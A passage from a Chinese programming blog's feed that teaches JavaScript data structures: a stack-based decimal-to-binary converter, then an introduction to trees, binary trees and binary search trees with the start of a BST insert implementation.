class="comment">//封装函数：将十进制转成二进制(十转二的运算最后倒叙取余的特点符合栈&#x27;先进后出&#x27;)</span></span><br><span class="line"><span class="keyword">let</span> dec2bin = <span class="function"><span class="params">decNumber</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">//1.定义一个栈对象，保存余数</span></span><br><span class="line">  <span class="keyword">var</span>  stack = <span class="keyword">new</span> Stack()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 2.循环操作</span></span><br><span class="line">  <span class="keyword">while</span>(decNumber &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">// 2.1.获取余数并放入栈中</span></span><br><span class="line">    stack.push(decNumber % <span class="number">2</span>)</span><br><span class="line">    <span class="comment">// 2.2.获取整除后的结果作为下一次运算的数字(floor:向下取整)</span></span><br><span class="line">    decNumber = <span class="built_in">Math</span>.floor(decNumber / <span class="number">2</span>)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 3.从栈中取出0和1</span></span><br><span class="line">  <span class="keyword">let</span>  binaryString = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  <span class="keyword">let</span> a = stack.items.length</span><br><span class="line"> <span class="keyword">while</span>(stack.items.length != <span class="number">0</span>)&#123;</span><br><span class="line">    binaryString += stack.pop();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> binaryString;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试代码</span></span><br><span class="line"><span class="built_in">console</span>.log(dec2bin(<span class="number">10</span>));<span class="comment">//103</span></span><br><span class="line"><span class="built_in">console</span>.log(dec2bin(<span class="number">100</span>));<span class="comment">//104</span></span><br><span class="line"><span class="built_in">console</span>.log(dec2bin(<span class="number">1000</span>));<span class="comment">//105</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>测试结果：</strong></p><p><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%88/3.png" alt="image-20200305205547226"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="http://aiolimp.com/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
    <category term="数据结构" scheme="http://aiolimp.com/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>树结构简介</title>
    <link href="http://aiolimp.com/2022/07/10/JavaScript%E5%AE%9E%E7%8E%B0%E6%A0%91%E7%BB%93%E6%9E%84/"/>
    <id>http://aiolimp.com/2022/07/10/JavaScript%E5%AE%9E%E7%8E%B0%E6%A0%91%E7%BB%93%E6%9E%84/</id>
    <published>2022-07-10T02:23:20.000Z</published>
    <updated>2023-03-05T14:22:34.187Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="一、树结构简介"><a href="#一、树结构简介" class="headerlink" title="一、树结构简介"></a>一、树结构简介</h2><h4 id="1-1-简单了解树结构"><a href="#1-1-简单了解树结构" class="headerlink" title="1.1.简单了解树结构"></a>1.1.简单了解树结构</h4><p><strong>什么是树？</strong></p><p>真实的树：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/1.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/1.png" alt="image-20200229205530929"></a></p><p><strong>树的特点：</strong></p><ul><li>树一般都有一个<strong>根</strong>，连接着根的是<strong>树干</strong>；</li><li>树干会发生分叉，形成许多<strong>树枝</strong>，树枝会继续分化成更小的<strong>树枝</strong>；</li><li>树枝的最后是<strong>叶子</strong>；</li></ul><p>现实生活中很多结构都是树的抽象，模拟的树结构相当于旋转<code>180°</code>的树。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/2.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/2.png" alt="image-20200229205630945"></a></p><p><strong>树结构对比于数组/链表/哈希表有哪些优势呢：</strong></p><p><strong>数组：</strong></p><ul><li>优点：可以通过<strong>下标值访问</strong>，效率高；</li><li>缺点：查找数据时需要先对数据进行<strong>排序</strong>，生成<strong>有序数组</strong>，才能提高查找效率；并且在插入和删除元素时，需要大量的<strong>位移操作</strong>；</li></ul><p><strong>链表：</strong></p><ul><li>优点：数据的插入和删除操作效率都很高；</li><li>缺点：<strong>查找</strong>效率低，需要从头开始依次查找，直到找到目标数据为止；当需要在链表中间位置插入或删除数据时，插入或删除的效率都不高。</li></ul><p><strong>哈希表：</strong></p><ul><li>优点：哈希表的插入/查询/删除效率都非常高；</li><li>缺点：<strong>空间利用率不高</strong>，底层使用的数组中很多单元没有被利用；并且哈希表中的元素是<strong>无序</strong>的，不能按照固定顺序遍历哈希表中的元素；而且不能快速找出哈希表中<strong>最大值或最小值</strong>这些特殊值。</li></ul><p><strong>树结构：</strong></p><p>优点：树结构综合了上述三种结构的优点，同时也弥补了它们存在的缺点（虽然效率不一定都比它们高），比如树结构中数据都是有序的，查找效率高；空间利用率高；并且可以快速获取最大值和最小值等。</p><p>总的来说：<strong>每种数据结构都有自己特定的应用场景</strong></p><p><strong>树结构：</strong></p><ul><li><strong>树（Tree）</strong>:由 n（n ≥ 0）个节点构成的<strong>有限集合</strong>。当 n = 0 时，称为<strong>空树</strong>。</li></ul><p>对于任一棵非空树（n &gt; 0），它具备以下性质：</p><ul><li>数中有一个称为<strong>根（Root）</strong>的特殊节点，用 **r **表示；</li><li>其余节点可分为 m（m &gt; 0）个互不相交的有限集合 T1，T2，…，Tm，其中每个集合本身又是一棵树，称为原来树的<strong>子树（SubTree）</strong>。</li></ul><p><strong>树的常用术语：</strong></p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/3.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/3.png" alt="image-20200229221126468"></a></p><ul><li><strong>节点的度（Degree）</strong>：节点的<strong>子树个数</strong>，比如节点B的度为2；</li><li><strong>树的度</strong>：树的所有节点中<strong>最大的度数</strong>，如上图树的度为2；</li><li><strong>叶节点（Leaf）</strong>：<strong>度为0的节点</strong>（也称为叶子节点），如上图的H，I等；</li><li><strong>父节点（Parent）</strong>：度不为0的节点称为父节点，如上图节点B是节点D和E的父节点；</li><li><strong>子节点（Child）</strong>：若B是D的父节点，那么D就是B的子节点；</li><li><strong>兄弟节点（Sibling）</strong>：具有同一父节点的各节点彼此是兄弟节点，比如上图的B和C，D和E互为兄弟节点；</li><li><strong>路径和路径长度</strong>：路径指的是一个节点到另一节点的通道，路径所包含边的个数称为路径长度，比如A-&gt;H的路径长度为3；</li><li><strong>节点的层次（Level）</strong>：规定<strong>根节点在1层</strong>，其他任一节点的层数是其父节点的<strong>层数加1</strong>。如B和C节点的层次为2；</li><li><strong>树的深度（Depth）</strong>：树种所有节点中的<strong>最大层次</strong>是这棵树的深度，如上图树的深度为4；</li></ul><h4 id="1-2-树结构的表示方式"><a href="#1-2-树结构的表示方式" class="headerlink" title="1.2.树结构的表示方式"></a>1.2.树结构的表示方式</h4><ul><li><strong>最普通的表示方法</strong>：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/4.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/4.png" alt="image-20200229230417613"></a></p><p>如图，树结构的组成方式类似于链表，都是由一个个节点连接构成。不过，根据每个父节点子节点数量的不同，每一个父节点需要的引用数量也不同。比如节点A需要3个引用，分别指向子节点B，C，D；B节点需要2个引用，分别指向子节点E和F；K节点由于没有子节点，所以不需要引用。</p><p>这种方法缺点在于我们无法确定某一结点的引用数。</p><ul><li><strong>儿子-兄弟表示法</strong>：</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/5.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/5.png" alt="image-20200229232805477"></a></p><p>这种表示方法可以完整地记录每个节点的数据，比如：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//节点A</span></span><br><span class="line">Node&#123;</span><br><span class="line">  <span class="comment">//存储数据</span></span><br><span class="line">  <span class="keyword">this</span>.<span class="keyword">data</span> = <span class="keyword">data</span></span><br><span class="line">  <span class="comment">//统一只记录左边的子节点</span></span><br><span class="line">  <span class="keyword">this</span>.leftChild = B</span><br><span class="line">  <span class="comment">//统一只记录右边的第一个兄弟节点</span></span><br><span class="line">  <span class="keyword">this</span>.rightSibling = <span class="literal">null</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//节点B</span></span><br><span class="line">Node&#123;</span><br><span class="line">  <span class="keyword">this</span>.<span class="keyword">data</span> = <span class="keyword">data</span></span><br><span class="line">  <span class="keyword">this</span>.leftChild = E</span><br><span class="line">  <span class="keyword">this</span>.rightSibling = C</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//节点F</span></span><br><span class="line">Node&#123;</span><br><span class="line">  <span class="keyword">this</span>.<span class="keyword">data</span> = <span class="keyword">data</span></span><br><span class="line">  <span class="keyword">this</span>.leftChild = <span class="literal">null</span></span><br><span class="line">  <span class="keyword">this</span>.rightSibling = <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种表示法的优点在于每一个节点中引用的数量都是确定的。</p><ul><li><strong>儿子-兄弟表示法旋转</strong></li></ul><p>以下为儿子-兄弟表示法组成的树结构：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/6.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/6.png" alt="image-20200229234549049"></a></p><p>将其顺时针旋转45°之后：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/7.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/7.png" alt="image-20200229235549522"></a></p><p>这样就成为了一棵<strong>二叉树</strong>，由此我们可以得出结论：<strong>任何树都可以通过二叉树进行模拟</strong>。但是这样父节点不是变了吗？其实，父节点的设置只是为了方便指向子节点，在代码实现中谁是父节点并没有关系，只要能正确找到对应节点即可。</p><h2 id="二、二叉树"><a href="#二、二叉树" class="headerlink" title="二、二叉树"></a>二、二叉树</h2><h4 id="2-1-二叉树简介"><a href="#2-1-二叉树简介" class="headerlink" title="2.1.二叉树简介"></a>2.1.二叉树简介</h4><p><strong>二叉树的概念</strong>：如果树中的每一个节点最多只能由<strong>两个子节点</strong>，这样的树就称为<strong>二叉树</strong>；</p><p>二叉树十分重要，不仅仅是因为简单，更是因为几乎所有的树都可以表示成二叉树形式。</p><p><strong>二叉树的组成</strong>：</p><ul><li>二叉树可以为空，也就是没有节点；</li><li>若二叉树不为空，则它由根节点和称为其左子树TL和右子树TR的两个不相交的二叉树组成；</li></ul><p><strong>二叉树的五种形态</strong>：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/8.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/8.png" alt="image-20200301001718079"></a></p><p>上图分别表示：空的二叉树、只有一个节点的二叉树、只有左子树TL的二叉树、只有右子树TR的二叉树和有左右两个子树的二叉树。</p><p><strong>二叉树的特性</strong>：</p><ul><li>一个二叉树的第 i 层的最大节点树为：2(i-1)，i &gt;= 1；</li><li>深度为k的二叉树的最大节点总数为：2k - 1 ，k &gt;= 1；</li><li>对任何非空二叉树，若 n0 表示叶子节点的个数，n2表示度为2的非叶子节点个数，那么两者满足关系：n0 = n2 + 1；如下图所示：H，E，I，J，G为叶子节点，总数为5；A，B，C，F为度为2的非叶子节点，总数为4；满足n0 = n2 + 1的规律。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/9.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/9.png" alt="image-20200301092140211"></a></p><h4 id="2-2-特殊的二叉树"><a href="#2-2-特殊的二叉树" class="headerlink" title="2.2.特殊的二叉树"></a>2.2.特殊的二叉树</h4><p><strong>完美二叉树</strong></p><p>完美二叉树（Perfect Binary Tree）也成为满二叉树（Full Binary Tree），在二叉树中，除了最下一层的叶子节点外，每层节点都有2个子节点，这就构成了完美二叉树。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/10.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/10.png" alt="image-20200301093237681"></a></p><p><strong>完全二叉树</strong></p><p>完全二叉树（Complete Binary Tree）:</p><ul><li>除了二叉树最后一层外，其他各层的节点数都达到了最大值；</li><li>并且，最后一层的叶子节点从左向右是连续存在，只缺失右侧若干叶子节点；</li><li>完美二叉树是特殊的完全二叉树；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/11.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/11.png" alt="image-20200301093659373"></a></p><p>在上图中，由于H缺失了右子节点，所以它不是完全二叉树。</p><h4 id="2-3-二叉树的数据存储"><a href="#2-3-二叉树的数据存储" class="headerlink" title="2.3.二叉树的数据存储"></a>2.3.二叉树的数据存储</h4><p>常见的二叉树存储方式为<strong>数组</strong>和<strong>链表</strong>：</p><p><strong>使用数组：</strong></p><ul><li><strong>完全二叉树</strong>：按从上到下，从左到右的方式存储数据。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/12.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/12.png" alt="image-20200301094919588"></a></p><p>image-20200301094919588</p><table><thead><tr><th>节点</th><th>A</th><th>B</th><th>C</th><th>D</th><th>E</th><th>F</th><th>G</th><th>H</th></tr></thead><tbody><tr><td><strong>序号</strong></td><td><strong>1</strong></td><td><strong>2</strong></td><td><strong>3</strong></td><td><strong>4</strong></td><td><strong>5</strong></td><td><strong>6</strong></td><td><strong>7</strong></td><td><strong>8</strong></td></tr></tbody></table><p>使用数组存储时，取数据的时候也十分方便：左子节点的序号等于父节点序号 * 2，右子节点的序号等于父节点序号 * 2 + 1 。</p><ul><li><strong>非完全二叉树</strong>：非完全二叉树需要转换成完全二叉树才能按照上面的方案存储，这样会浪费很大的存储空间。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/13.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/13.png" alt="image-20200301100043636"></a></p><table><thead><tr><th>节点</th><th>A</th><th>B</th><th>C</th><th>^</th><th>^</th><th>F</th><th>^</th><th>^</th><th>^</th><th>^</th><th>^</th><th>^</th><th>M</th></tr></thead><tbody><tr><td><strong>序号</strong></td><td><strong>1</strong></td><td><strong>2</strong></td><td><strong>3</strong></td><td><strong>4</strong></td><td><strong>5</strong></td><td><strong>6</strong></td><td><strong>7</strong></td><td><strong>8</strong></td><td><strong>9</strong></td><td><strong>10</strong></td><td><strong>11</strong></td><td><strong>12</strong></td><td><strong>13</strong></td></tr></tbody></table><p><strong>使用链表</strong></p><p>二叉树最常见的存储方式为<strong>链表</strong>：每一个节点封装成一个Node，Node中包含存储的数据、左节点的引用和右节点的引用。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/14.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/14.png" alt="image-20200301100616105"></a></p><h2 id="三、二叉搜索树"><a href="#三、二叉搜索树" class="headerlink" title="三、二叉搜索树"></a>三、二叉搜索树</h2><h4 id="3-1-认识二叉搜索树"><a href="#3-1-认识二叉搜索树" class="headerlink" title="3.1.认识二叉搜索树"></a>3.1.认识二叉搜索树</h4><p><strong>二叉搜索树</strong>（<strong>BST</strong>，Binary Search Tree），也称为<strong>二叉排序树</strong>和<strong>二叉查找树</strong>。</p><p>二叉搜索树是一棵二叉树，可以为空；</p><p>如果不为空，则满足以下<strong>性质</strong>：</p><ul><li>条件1：非空左子树的<strong>所有</strong>键值<strong>小于</strong>其根节点的键值。比如三中节点6的所有非空左子树的键值都小于6；</li><li>条件2：非空右子树的<strong>所有</strong>键值<strong>大于</strong>其根节点的键值；比如三中节点6的所有非空右子树的键值都大于6；</li><li>条件3：左、右子树本身也都是二叉搜索树；</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/15.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/15.png" alt="image-20200301103139916"></a></p><p>如上图所示，树二和树三符合3个条件属于二叉树，树一不满足条件3所以不是二叉树。</p><p><strong>总结：</strong>二叉搜索树的特点主要是<strong>较小的值</strong>总是保存在<strong>左节点</strong>上，相对<strong>较大的值</strong>总是保存在<strong>右节点</strong>上。这种特点使得二叉搜索树的查询效率非常高，这也就是二叉搜索树中”搜索”的来源。</p><h4 id="3-2-二叉搜索树应用举例"><a href="#3-2-二叉搜索树应用举例" class="headerlink" title="3.2.二叉搜索树应用举例"></a>3.2.二叉搜索树应用举例</h4><p>下面是一个二叉搜索树：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/16.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/16.png" alt="image-20200301111718686"></a></p><p>若想在其中查找数据10，只需要查找4次，查找效率非常高。</p><ul><li>第1次：将10与根节点9进行比较，由于10 &gt; 9，所以10下一步与根节点9的右子节点13比较；</li><li>第2次：由于10 &lt; 13，所以10下一步与父节点13的左子节点11比较；</li><li>第3次：由于10 &lt; 11，所以10下一步与父节点11的左子节点10比较；</li><li>第4次：由于10 = 10，最终查找到数据10 。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/17.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/17.png" alt="image-20200301111751041"></a></p><p>同样是15个数据，在排序好的数组中查询数据10，需要查询10次：</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/18.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%B8%80/18.png" alt="image-20200301115348138"></a></p><p>其实：如果是排序好的数组，可以通过二分查找：第一次找9，第二次找13，第三次找15…。我们发现如果把每次二分的数据拿出来以树的形式表示的话就是<strong>二叉搜索树</strong>。这就是数组二分法查找效率之所以高的原因。</p><h2 id="四、二叉搜索树的封装"><a href="#四、二叉搜索树的封装" class="headerlink" title="四、二叉搜索树的封装"></a>四、二叉搜索树的封装</h2><p><strong>二叉树搜索树的基本属性</strong>：</p><p>如图所示：二叉搜索树有四个最基本的属性：指向节点的<strong>根</strong>（root），节点中的<strong>键</strong>（key）、<strong>左指针</strong>（right）、<strong>右指针</strong>（right）。</p><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/1.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/1.png" alt="image-20200301162706755"></a></p><p>所以，二叉搜索树中除了定义root属性外，还应定义一个节点内部类，里面包含每个节点中的left、right和key三个属性：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">//封装二叉搜索树</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">BinarySearchTree</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//节点内部类</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Node</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">      <span class="built_in">this</span>.key = key</span><br><span class="line">      <span class="built_in">this</span>.left = <span class="literal">null</span></span><br><span class="line">      <span class="built_in">this</span>.right = <span class="literal">null</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//属性</span></span><br><span class="line">    <span class="built_in">this</span>.root = <span class="literal">null</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>二叉搜索树的常见操作：</strong></p><ul><li>insert（key）：向树中插入一个新的键；</li><li>search（key）：在树中查找一个键，如果节点存在，则返回true；如果不存在，则返回false；</li><li>inOrderTraverse：通过中序遍历方式遍历所有节点；</li><li>preOrderTraverse：通过先序遍历方式遍历所有节点；</li><li>postOrderTraverse：通过后序遍历方式遍历所有节点；</li><li>min：返回树中最小的值/键；</li><li>max：返回树中最大的值/键；</li><li>remove（key）：从树中移除某个键；</li></ul><h4 id="1-插入数据"><a href="#1-插入数据" class="headerlink" title="1.插入数据"></a>1.插入数据</h4><p><strong>实现思路：</strong></p><ul><li>首先根据传入的key创建节点对象；</li><li>然后判断根节点是否存在，不存在时通过：this.root = newNode，直接把新节点作为二叉搜索树的根节点。</li><li>若存在根节点则重新定义一个内部方法insertNode（）用于查找插入点。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//insert方法:对外向用户暴露的方法</span></span><br><span class="line"> BinarySearchTree.prototype.insert = <span class="function"><span class="keyword">function</span>(<span class="params">key</span>)</span>&#123;</span><br><span class="line">   <span class="comment">//1.根据key创建节点</span></span><br><span class="line">   <span class="keyword">let</span> newNode = <span class="keyword">new</span> Node(key)</span><br><span class="line">     </span><br><span class="line">   <span class="comment">//2.判断根节点是否存在</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="built_in">this</span>.root == <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.root = newNode</span><br><span class="line">     <span class="comment">//根节点存在时</span></span><br><span class="line">   &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.insertNode(<span class="built_in">this</span>.root, newNode)</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p><strong>内部方法insertNode（）的实现思路</strong>:</p><p>根据比较传入的两个节点，一直查找新节点适合插入的位置，直到成功插入新节点为止。</p><p>当newNode.key &lt; node.key向左查找:</p><ul><li>情况1：当node无左子节点时，直接插入：</li><li>情况2：当node有左子节点时，递归调用insertNode(),直到遇到无左子节点成功插入newNode后，不再符合该情况，也就不再调用insertNode()，递归停止。</li></ul><p><a href="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/2.png"><img src="https://gitee.com/ahuntsun/BlogImgs/raw/master/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/%E6%A0%91%E4%BA%8C/2.png" alt="image-20200301191640632"></a></p><p>当newNode.key &gt;= node.key向右查找，与向左查找类似：</p><ul><li>情况1：当node无右子节点时，直接插入：</li><li>情况2：当node有右子节点时，依然递归调用insertNode(),直到遇到传入insertNode方法的node无右子节点成功插入newNode为止：</li></ul><p><a 